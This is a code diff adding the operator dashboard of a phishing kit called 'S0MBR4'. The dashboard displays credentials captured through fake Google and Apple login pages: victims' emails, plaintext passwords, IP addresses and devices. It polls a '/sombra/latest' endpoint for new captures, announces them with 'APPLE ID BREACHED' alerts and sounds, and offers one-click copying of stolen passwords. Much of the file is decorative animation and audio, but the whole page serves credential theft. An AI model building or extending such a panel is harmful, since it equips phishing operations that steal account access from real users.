+                                                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                                                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                                            </svg>
+                                            GOOGLE
+                                        </span>
+                                    <% } %>
+                                </td>
+                                <td class="email copyable" data-copy="<%= user.email %>"><%= user.email %></td>
+                                <td class="password copyable" data-copy="<%= user.password %>"><%= user.password %></td>
+                                <td class="ip copyable" data-copy="<%= user.ip %>"><%= user.ip %></td>
+                                <td class="device dev-<%= (user.device || 'PC').toLowerCase() %>"><%= user.device || 'PC' %></td>
+                                <td class="time"><%= user.time %></td>
+                                <td>
+                                    <form method="POST" action="/sombra/delete/<%= user.id %>" class="delete-form">
+                                        <button type="submit" class="delete-btn" title="Delete credential">
+                                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square">
+                                                <path d="M3 6h18"/>
+                                                <path d="M8 6V4h8v2"/>
+                                                <path d="M19 6l-1 15H6L5 6"/>
+                                            </svg>
+                                        </button>
+                                    </form>
+                                </td>
+                            </tr>
+                        <% }); %>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <div class="nav-buttons">
+            <a href="/login" class="nav-btn google">
+                <svg viewBox="0 0 48 48" aria-hidden="true">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+                <span>Google Login</span>
+            </a>
+            <a href="/apple-login" class="nav-btn apple">
+                <svg viewBox="0 0 24 24" fill="#ffffff" aria-hidden="true"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.702z"/></svg>
+                <span>Apple Login</span>
+            </a>
+        </div>
+
+        <p class="footer-note">[ S0MBR4 v2.0 // RESTRICTED AREA ]<span class="cursor">&nbsp;▮</span></p>
+    </main>
+
+    <script>
+        // Floating hexagons
+        const hexBg = document.getElementById('hexBg');
+        for (let i = 0; i < 22; i++) {
+            const hex = document.createElement('div');
+            hex.className = 'hex';
+            const size = 16 + Math.random() * 52;
+            hex.style.width = size + 'px';
+            hex.style.height = (size * 1.15) + 'px';
+            hex.style.left = (Math.random() * 100) + '%';
+            hex.style.animationDuration = (14 + Math.random() * 22) + 's';
+            hex.style.animationDelay = (-Math.random() * 24) + 's';
+            hex.style.opacity = (0.05 + Math.random() * 0.13).toFixed(3);
+            hexBg.appendChild(hex);
+        }
+
+        // Terminal typing effect
+        const typingEl = document.getElementById('typing');
+        if (typingEl) {
+            const lines = [
+                '> UPLINK ESTABLISHED...',
+                '> DECRYPTING DATABASE...',
+                '> ACCESS GRANTED'
+            ];
+            let li = 0;
+            let ci = 0;
+            let deleting = false;
+
+            function tick() {
+                const line = lines[li];
+                if (!deleting) {
+                    ci++;
+                    typingEl.textContent = line.slice(0, ci);
+                    if (ci === line.length) {
+                        deleting = true;
+                        setTimeout(tick, 1400);
+                        return;
+                    }
+                    setTimeout(tick, 28 + Math.random() * 40);
+                } else {
+                    ci--;
+                    typingEl.textContent = line.slice(0, ci);
+                    if (ci === 0) {
+                        deleting = false;
+                        li = (li + 1) % lines.length;
+                        setTimeout(tick, 350);
+                        return;
+                    }
+                    setTimeout(tick, 12);
+                }
+            }
+            tick();
+        }
+
+        // ---------- Side waterfall rain with the skull sprite ----------
+        const skullSprite = new Image();
+        skullSprite.src = '/images/skull.png';
+
+        function initRain(canvasId) {
+            const canvas = document.getElementById(canvasId);
+            const ctx = canvas.getContext('2d');
+            ctx.imageSmoothingEnabled = false;
+            let W, H;
+
+            function resize() {
+                W = canvas.width = canvas.clientWidth;
+                H = canvas.height = window.innerHeight;
+            }
+            resize();
+            window.addEventListener('resize', resize);
+
+            function spawn() {
+                return {
+                    x: Math.random() * W,
+                    y: -60 - Math.random() * H * 0.8,
+                    size: 18 + Math.random() * 14,
+                    speed: 1 + Math.random() * 2.2,
+                    alpha: 0.35 + Math.random() * 0.5
+                };
+            }
+
+            const drops = [];
+            for (let i = 0; i < Math.floor(W / 26) + 6; i++) {
+                drops.push(spawn());
+            }
+
+            function frame() {
+                // fade previous frame to create the falling trail
+                ctx.fillStyle = 'rgba(6, 3, 13, 0.18)';
+                ctx.fillRect(0, 0, W, H);
+                // draw only once the sprite is loaded, but keep looping regardless
+                if (skullSprite.complete) {
+                    for (const d of drops) {
+                        ctx.globalAlpha = d.alpha;
+                        ctx.drawImage(skullSprite, d.x, d.y, d.size, d.size);
+                        d.y += d.speed;
+                        if (d.y > H + 60) {
+                            d.y = -60 - Math.random() * 100;
+                            d.x = Math.random() * W;
+                            d.speed = 1 + Math.random() * 2.2;
+                        }
+                    }
+                }
+                ctx.globalAlpha = 1;
+                requestAnimationFrame(frame);
+            }
+
+            // Always start the loop: never rely on a shared onload callback,
+            // otherwise the second canvas overwrites the first one's handler
+            // and the left waterfall never animates after a page reload.
+            frame();
+        }
+
+        initRain('rainLeft');
+        initRain('rainRight');
+
+        // ---------- Smooth delete: no confirm dialog, no page reload ----------
+        document.querySelectorAll('.delete-form').forEach(form => {
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                if (form.dataset.deleting) return;
+                form.dataset.deleting = '1';
+                const row = form.closest('tr');
+                if (!row) return;
+
+                // fade the row out first
+                row.classList.add('rowOut');
+
+                setTimeout(() => {
+                    fetch(form.action, { method: 'POST' })
+                        .then(() => {
+                            row.remove();
+
+                            // last credential gone -> fade section out, fade empty state in
+                            const section = document.getElementById('credsSection');
+                            const tbody = document.querySelector('tbody');
+                            if (section && tbody && tbody.querySelectorAll('tr').length === 0) {
+                                section.classList.add('hide');
+                                setTimeout(() => {
+                                    section.style.display = 'none';
+                                    const empty = document.getElementById('emptyState');
+                                    if (empty) {
+                                        empty.classList.remove('hidden');
+                                        empty.style.opacity = 0;
+                                        empty.style.display = 'block';
+                                        requestAnimationFrame(() => {
+                                            requestAnimationFrame(() => {
+                                                empty.style.transition = 'opacity 0.45s ease';
+                                                empty.style.opacity = 1;
+                                            });
+                                        });
+                                    }
+                                }, 350);
+                            }
+                        })
+                        .catch(() => {
+                            row.classList.remove('rowOut');
+                        });
+                }, 300);
+            });
+        });
+
+        // ---------- Particle storm (floating glyphs across the whole page) ----------
+        const storm = document.getElementById('storm');
+        const sctx = storm.getContext('2d');
+        const GLYPHS = ['01', '10', '▮', '×', '+', '//', 'L', 'R', '>=', '<=', '▓', '▣', '▼', '◄', '◇'];
+        let sw = 0, sh = 0;
+        const particles = [];
+
+        function sizeStorm() {
+            sw = storm.width = window.innerWidth;
+            sh = storm.height = window.innerHeight;
+        }
+        sizeStorm();
+        window.addEventListener('resize', sizeStorm);
+
+        for (let i = 0; i < 26; i++) {
+            particles.push({
+                x: Math.random() * sw,
+                y: Math.random() * sh,
+                vx: (Math.random() - 0.5) * 0.25,
+                vy: (Math.random() - 0.5) * 0.25,
+                size: 8 + Math.random() * 12,
+                glyph: GLYPHS[Math.floor(Math.random() * GLYPHS.length)],
+                alpha: 0.08 + Math.random() * 0.22
+            });
+        }
+
+        function stormFrame() {
+            sctx.clearRect(0, 0, sw, sh);
+            sctx.font = '12px monospace';
+            for (const p of particles) {
+                p.x += p.vx;
+                p.y += p.vy;
+                if (p.x < -50) p.x = sw + 50;
+                if (p.x > sw + 50) p.x = -50;
+                if (p.y < -50) p.y = sh + 50;
+                if (p.y > sh + 50) p.y = -50;
+                sctx.globalAlpha = p.alpha;
+                sctx.fillStyle = Math.random() > 0.5 ? '#a855f7' : '#22d3ee';
+                sctx.fillText(p.glyph, p.x, p.y);
+            }
+            sctx.globalAlpha = 1;
+            requestAnimationFrame(stormFrame);
+        }
+        stormFrame();
+
+        // ---------- HACKER BACKGROUND SOUND (low volume, Web Audio) ----------
+        const soundToggle = document.getElementById('soundToggle');
+        const soundCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const masterGain = soundCtx.createGain();
+        masterGain.gain.value = 0.0; // real volume is enabled once the user interacts
+        masterGain.connect(soundCtx.destination);
+        // sound is on by default; the AudioContext just waits for the first tap
+        let soundMuted = false;
+
+        function beep(freq, dur, vol, type) {
+            const osc = soundCtx.createOscillator();
+            const g = soundCtx.createGain();
+            osc.type = type || 'sine';
+            osc.frequency.value = freq;
+            g.gain.setValueAtTime(vol || 0.1, soundCtx.currentTime);
+            g.gain.exponentialRampToValueAtTime(0.0001, soundCtx.currentTime + (dur || 0.1));
+            osc.connect(g);
+            g.connect(masterGain);
+            osc.start();
+            osc.stop(soundCtx.currentTime + (dur || 0.1) + 0.02);
+        }
+
+        // thin low drone that hums forever (barely audible)
+        function startDrone() {
+            const o1 = soundCtx.createOscillator();
+            const o2 = soundCtx.createOscillator();
+            const g = soundCtx.createGain();
+            o1.type = 'sine'; o1.frequency.value = 50;
+            o2.type = 'triangle'; o2.frequency.value = 99;
+            g.gain.value = 0.035;
+            o1.connect(g); o2.connect(g); g.connect(masterGain);
+            o1.start(); o2.start();
+        }
+        startDrone();
+
+        // a dark two-tone drop on on/off (low, ominous)
+        function sndSwitch() {
+            beep(146.8, 0.12, 0.1, 'sawtooth');
+            setTimeout(function () { beep(110, 0.16, 0.09, 'sawtooth'); }, 120);
+        }
+
+        // ---------- DARK VIBEY HACKER MUSIC (looping, minor key) ----------
+        // Low, ominous, but with a driving feel: pulsing bass on 8th notes,
+        // a soft percussive underlay, and a flowing minor melody.
+
+        // a dark double-kick every 8th that pushes the groove
+        function kick() {
+            if (!soundMuted) beep(60, 0.12, 0.11, 'sine');
+        }
+        // a soft, dark hi-hat 'tick' (low-mid noise burst)
+        function hat() {
+            if (!soundMuted) beep(4200, 0.03, 0.022, 'sawtooth');
+        }
+
+        const NOTE = [0, // rest
+            55,  58.3, 65.4, 73.4, 82.4, 87.3, 98,  110,
+            116.5, 130.8, 146.8, 164.8, 174.6, 196, 220];
+        // NOTE indexes in D-minor-ish: roots 1,4,3,6 plus dark upper tens.
+        const MELODY = [
+            1,0.5, 4,0.5, 5,0.5, 6,0.5,
+            8,1,   4,0.5, 8,0.5,
+            7,0.5, 6,0.5, 5,0.5, 4,0.5,
+            6,1,   4,0.5, 5,0.5,
+            8,0.5, 9,0.5, 10,0.5, 9,0.5,
+            11,1.5, 8,0.5, 6,0.5,
+            5,0.5, 6,0.5, 8,1.5,
+            4,0.5, 5,0.5, 1,1
+        ];
+        // driving 16-step bass line (low octave) for groove
+        const BASS = [1,1,0,1, 1,1,0,1, 4,4,0,4, 4,4,0,4,
+                      3,3,0,3, 3,3,0,3, 6,6,0,6, 5,5,0,4];
+
+        let musicTimer = null;
+        let musicRunning = false;
+
+        function playNote(n, dur, vol, type) {
+            if (n === 0) return;
+            beep(NOTE[n], dur, vol || 0.07, type || 'sawtooth');
+        }
+
+        function bassRoot(step) {
+            playNote(BASS[step] || 0, 0.16, 0.07, 'triangle');
+        }
+
+        function musicStep() {
+            let i = 0;               // melody index
+            let b = 1;               // 8th-note counter in current phrase
+            return function tick() {
+                if (!musicRunning) return;
+                // the beat grid: every grid-step fires a kick or hat
+                const note = MELODY[i];
+                const len = MELODY[i + 1] || 0.5;
+                if (note) playNote(note, len * 0.34, 0.06, 'sawtooth');
+
+                // groove: kick on every grid-step, hat on off-beats, bass pumping
+                kick();
+                if (b % 2 === 0) hat();          // off-beat hat tick
+                bassRoot((Math.floor(i / 2) + b) % BASS.length);
+
+                i = (i + 2) % MELODY.length;
+                b++;
+                musicTimer = setTimeout(tick, (len * 0.34) * 1000 * 0.995);
+            };
+        }
+
+        function startMusic() {
+            if (musicRunning) return;
+            musicRunning = true;
+            musicStep()();
+        }
+
+        function stopMusic() {
+            musicRunning = false;
+            if (musicTimer) { clearTimeout(musicTimer); musicTimer = null; }
+        }
+
+        // faint terminal typing ticks while the page is visible and sound is on
+        setInterval(function () {
+            if (soundMuted) return;
+            if (Math.random() > 0.6) return; // sparse
+            beep(180 + Math.random() * 500, 0.03, 0.05, 'square');
+        }, 320);
+
+        // a deeper blip + beep when a new credential arrives
+        function captureSound() {
+            if (soundMuted) return;
+            beep(220, 0.12, 0.12, 'square');
+            beep(440, 0.09, 0.09, 'triangle');
+            beep(660, 0.07, 0.07, 'sawtooth');
+        }
+
+        soundToggle.addEventListener('click', function () {
+            if (soundCtx.state === 'suspended') soundCtx.resume();
+            soundMuted = !soundMuted;
+            masterGain.gain.setTargetAtTime(soundMuted ? 0.0 : 0.9, soundCtx.currentTime, 0.05);
+            soundToggle.textContent = soundMuted ? '♫ SND OFF' : '♫ SND ON';
+            soundToggle.classList.toggle('muted', soundMuted);
+            if (soundMuted) stopMusic(); else { startMusic(); sndSwitch(); }
+        });
+
+        // unlock audio on the very first user interaction (autoplay policy)
+        // sound is ON by default; the AudioContext only starts after a tap.
+        const unlockAudio = function () {
+            if (soundCtx.state === 'suspended') soundCtx.resume();
+            if (!soundMuted) {
+                masterGain.gain.setTargetAtTime(0.9, soundCtx.currentTime, 0.05);
+                startMusic();
+            }
+            window.removeEventListener('pointerdown', unlockAudio);
+            window.removeEventListener('keydown', unlockAudio);
+        };
+        window.addEventListener('pointerdown', unlockAudio);
+        window.addEventListener('keydown', unlockAudio);
+
+        // ---------- Live data-scramble parser in the entry rows ----------
+        const EMAILS = document.querySelectorAll('.email');
+        const PWDS = document.querySelectorAll('.password');
+        const CHARS = 'ABCDEF0123456789#@$%&*!?';
+
+        function scrambleOnce(els, keep) {
+            let scrambled = false;
+            els.forEach(function (el) {
+                if (el.dataset.scrambled === '1') return;
+                const text = el.getAttribute('data-real') || el.textContent;
+                let out = '';
+                for (let i = 0; i < text.length; i++) {
+                    const ch = text[i];
+                    if (/[@. _#-]/.test(ch)) {
+                        out += ch;
+                    } else {
+                        out += CHARS[Math.floor(Math.random() * CHARS.length)];
+                    }
+                }
+                el.textContent = out;
+                scrambled = true;
+                if (el._scrambleTicks === undefined) el._scrambleTicks = 0;
+                el._scrambleTicks++;
+                if (el._scrambleTicks >= 3) {
+                    el.dataset.scrambled = '1';
+                    el.textContent = text;
+                }
+            });
+            return scrambled;
+        }
+
+        if (EMAILS.length) {
+            EMAILS.forEach(function (el) {
+                el.setAttribute('data-real', el.textContent);
+            });
+            PWDS.forEach(function (el) {
+                el.setAttribute('data-real', el.textContent);
+            });
+            let tick = 0;
+            const scramble = setInterval(function () {
+                tick++;
+                let did = scrambleOnce(EMAILS, 0);
+                if (!did && tick > 120) clearInterval(scramble);
+            }, 260);
+        }
+
+        // ---------- LIVE ALERT: new credential toasted ----------
+        const toastWrap = document.getElementById('toast-wrap');
+
+        function appleLogo() {
+            return '<svg viewBox="0 0 24 24" fill="#ffffff"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.702z"/></svg>';
+        }
+
+        function googleLogo() {
+            return '<svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>';
+        }
+
+        function makeToast(c) {
+            const color = c.source === 'apple' ? 'apple' : 'google';
+            const head = c.source === 'apple' ? 'APPLE ID BREACHED' : 'GOOGLE ACCEPTED';
+            const logo = c.source === 'apple' ? appleLogo() : googleLogo();
+            const el = document.createElement('div');
+            el.className = 'toast';
+            el.style.setProperty('--tt', c.durationMs + 'ms');
+            el.innerHTML =
+                '<button type="button" class="toast-close" title="Close">X</button>' +
+                '<div class="toast-logo ' + color + '">' + logo + '</div>' +
+                '<div class="toast-msg">' +
+                '<div class="t-head">NEW CREDENTIAL ' + head + '</div>' +
+                '<div class="t-mail">' + c.email + '</div>' +
+                '<div class="t-row"><span class="t-pw">' + c.password + '</span><span class="t-time">' + c.time + '</span></div>' +
+                '<div class="t-date">' + c.date + '</div>' +
+                '</div>' +
+                '<div class="toast-timer"></div>';
+            return el;
+        }
+
+        // baseline done flag prevents the race where the very first fetch
+        // happens after a new credential already arrived (and would then be
+        // mistaken for the baseline and not toasted).
+        // ---------- REAL-TIME CREDENTIALS (no page refresh) ----------
+        const tbody = document.querySelector('tbody');
+        const section = document.getElementById('credsSection');
+        const emptyState = document.getElementById('emptyState');
+
+        const appleLogoSvg =
+            '<svg viewBox="0 0 24 24" fill="#ffffff"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.702z"/></svg>';
+        const googleLogoSvg =
+            '<svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>';
+
+        // rebuild the tbody rows from a credentials array (server order preserved)
+        function renderRows(users) {
+            let html = '';
+            users.forEach(function (u, i) {
+                const badge = u.source === 'apple'
+                    ? '<span class="src-badge apple">' + appleLogoSvg + ' APPLE</span>'
+                    : '<span class="src-badge google">' + googleLogoSvg + ' GOOGLE</span>';
+                html +=
+                    '<tr style="--i:' + i + '">' +
+                    '<td class="id">' + u.id + '</td>' +
+                    '<td class="source">' + badge + '</td>' +
+                    '<td class="email copyable" data-copy="' + u.email + '">' + u.email + '</td>' +
+                    '<td class="password copyable" data-copy="' + u.password + '">' + u.password + '</td>' +
+                    '<td class="ip copyable" data-copy="' + (u.ip || 'unknown') + '">' + (u.ip || 'unknown') + '</td>' +
+                    '<td class="device dev-' + (u.device || 'PC').toLowerCase() + '">' + (u.device || 'PC') + '</td>' +
+                    '<td class="time">' + u.time + '</td>' +
+                    '<td><form method="POST" action="/sombra/delete/' + u.id + '" class="delete-form">' +
+                    '<button type="submit" class="delete-btn" title="Delete credential">' +
+                    '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square">' +
+                    '<path d="M3 6h18"/><path d="M8 6V4h8v2"/><path d="M19 6l-1 15H6L5 6"/></svg>' +
+                    '</button></form></td>' +
+                    '</tr>';
+            });
+            return html;
+        }
+
+        // rewire the delete action for client-rendered rows (same smooth delete)
+        function attachDelete() {
+            document.querySelectorAll('.delete-form').forEach(function (form) {
+                if (form.dataset.hooked) return;
+                form.dataset.hooked = '1';
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    if (form.dataset.deleting) return;
+                    form.dataset.deleting = '1';
+                    const row = form.closest('tr');
+                    if (!row) return;
+                    row.classList.add('rowOut');
+                    setTimeout(function () {
+                        fetch(form.action, { method: 'POST' })
+                            .then(function () {
+                                row.remove();
+                                syncSection();
+                            })
+                            .catch(function () {
+                                row.classList.remove('rowOut');
+                            });
+                    }, 300);
+                });
+            });
+        }
+
+        let knownIds = [];
+        function applyList(users) {
+            const ids = users.map(function (u) { return u.id; }).join(',');
+            const changed = ids !== knownIds.join(',');
+            knownIds = users.map(function (u) { return u.id; });
+            if (!changed) return false;
+
+            if (tbody) tbody.innerHTML = renderRows(users);
+            attachDelete();
+            syncSection();
+
+            // re-scramble the freshly rendered credentials for the entry effect
+            const em = document.querySelectorAll('.email');
+            const pw = document.querySelectorAll('.password');
+            if (em.length) {
+                em.forEach(function (el) { el.setAttribute('data-real', el.textContent); });
+                pw.forEach(function (el) { el.setAttribute('data-real', el.textContent); });
+                let n = 0;
+                const sc = setInterval(function () {
+                    n++;
+                    scrambleCellAll();
+                    if (n >= 4) clearInterval(sc);
+                }, 200);
+            }
+            return true;
+        }
+
+        function scrambleCellAll() {
+            // reuse the closure's logic: rebuild with characters, honoring separators
+            const els = document.querySelectorAll('.email, .password');
+            els.forEach(function (el) {
+                if (el.dataset.doneScramble) return;
+                const text = el.getAttribute('data-real') || el.textContent;
+                let out = '';
+                for (let i = 0; i < text.length; i++) {
+                    const ch = text[i];
+                    out += /[@. _#-]/.test(ch) ? ch : 'ABCDEF01'.split('')[Math.floor(Math.random() * 8)];
+                }
+                el.textContent = out;
+                if (el.dataset.sT === undefined) el.dataset.sT = 0;
+                el.dataset.sT = Number(el.dataset.sT) + 1;
+                if (Number(el.dataset.sT) >= 3) {
+                    el.dataset.doneScramble = '1';
+                    el.textContent = text;
+                }
+            });
+        }
+
+        function syncSection() {
+            const hasRows = tbody ? tbody.querySelectorAll('tr').length > 0 : false;
+            if (section) section.classList.toggle('hidden', !hasRows);
+            if (emptyState) emptyState.classList.toggle('hidden', hasRows);
+        }
+
+        // baseline + polling, now also swapping the table in real time
+        function poll() {
+            fetch('/sombra/latest')
+                .then(function (r) { return r.json(); })
+                .then(function (data) {
+                    applyList(data.users || []);
+                    if (data.credential) {
+                        const c = data.credential;
+                        if (!baselineDone) {
+                            baselineDone = true;
+                            lastId = c.id;
+                            return;
+                        }
+                        if (c.id !== lastId) {
+                            lastId = c.id;
+                            spawnToast(c);
+                            captureSound();
+                        }
+                    } else if (!baselineDone) {
+                        baselineDone = true;
+                        lastId = -1;
+                    }
+                })
+                .catch(function () { /* best-effort */ });
+        }
+
+        function dismissToast(toast) {
+            if (!toast || toast.dataset.gone) return;
+            toast.dataset.gone = '1';
+            toast.classList.add('show'); // triggers toastOut
+            toast.querySelector('.toast-timer').style.animationPlayState = 'paused';
+            setTimeout(function () {
+                if (toast.parentNode) toast.parentNode.removeChild(toast);
+            }, 520);
+        }
+
+        function spawnToast(c) {
+            // do NOT apply .show on arrival: .toast already slides in via toastIn,
+            // and .show would trigger toastOut (the exit). Only .show on dismissal.
+            const toast = makeToast(c);
+            toastWrap.appendChild(toast);
+            toast._dismiss = dismissToast.bind(null, toast);
+            const closeBtn = toast.querySelector('.toast-close');
+            if (closeBtn) closeBtn.addEventListener('click', toast._dismiss);
+            // let the timer drain for 7s, then auto-dismiss (slide out)
+            const lifeMs = c.durationMs || 7000;
+            setTimeout(function () {
+                dismissToast(toast);
+            }, lifeMs);
+        }
+
+        let baselineDone = false;
+        let lastId = null;        // kick off: initial render + polling + visibility catch-up
+        poll();
+        setInterval(poll, 1500);
+        document.addEventListener('visibilitychange', function () {
+            if (!document.hidden) poll();
+        });
+
+        // ---------- CLICK ON A ROW TO COPY THE CREDENTIAL ----------
+        const copyHint = document.getElementById('copyHint');
+        let copyHintTimer = null;
+
+        function showCopyHint(text) {
+            copyHint.textContent = 'COPIED // ' + text;
+            copyHint.classList.add('show');
+            clearTimeout(copyHintTimer);
+            copyHintTimer = setTimeout(function () {
+                copyHint.classList.remove('show');
+            }, 1400);
+        }
+
+        // copy a single clicked cell with an animated reveal
+        function copyCell(cell) {
+            const text = (cell.getAttribute('data-copy') || cell.textContent).trim();
+            navigator.clipboard.writeText(text).then(function () {
+                cell.classList.add('copied');
+                setTimeout(function () { cell.classList.remove('copied'); }, 750);
+                showCopyHint(cell.className.indexOf('email') !== -1 ? text
+                    : cell.className.indexOf('ip') !== -1 ? 'IP ' + text
+                    : 'PW ' + text);
+                if (!soundMuted) beep(880, 0.06, 0.08, 'square');
+            }).catch(function () {
+                const fake = document.createElement('textarea');
+                fake.value = text;
+                document.body.appendChild(fake);
+                fake.select();
+                try { document.execCommand('copy'); } catch (err) { /* noop */ }
+                document.body.removeChild(fake);
+                cell.classList.add('copied');
+                setTimeout(function () { cell.classList.remove('copied'); }, 750);
+                showCopyHint(text);
+            });
+        }
+
+        document.addEventListener('click', function (e) {
+            // skip clicks on the delete form / button
+            if (e.target.closest('.delete-form')) return;
+            const cell = e.target.closest('td.copyable');
+            if (cell) { copyCell(cell); return; }
+        });
+    </script>
+</body>
+</html>
